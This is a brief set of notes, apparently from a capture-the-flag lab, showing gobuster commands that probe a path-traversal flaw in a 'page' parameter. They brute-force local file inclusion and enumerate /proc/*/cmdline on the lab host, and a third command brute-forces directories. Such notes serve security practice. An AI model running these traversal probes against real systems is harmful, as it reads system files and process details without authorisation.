*** Gobuster ile lfi (Path-traversal) ***
``` bash
gobuster -w /usr/share/wordlists/lfı/lfi.txt -u http://airplane.thm:8000/?page=../../../../../ dir -o lfi.txt --exclude-length 14
```

*** Gobuster with dizin içinde arama (Path-traversal) ***
``` bash
gobuster -w num.txt -u http://airplane.thm:8000/?page=../../../../../proc/{GOBUSTER}/cmdline dir -o proc.txt --exclude-length 14
```
```bash
gobuster dir -u https://mysite.com/path/to/folder -c -t 50 -w common-files.txt -x .php,.html
```


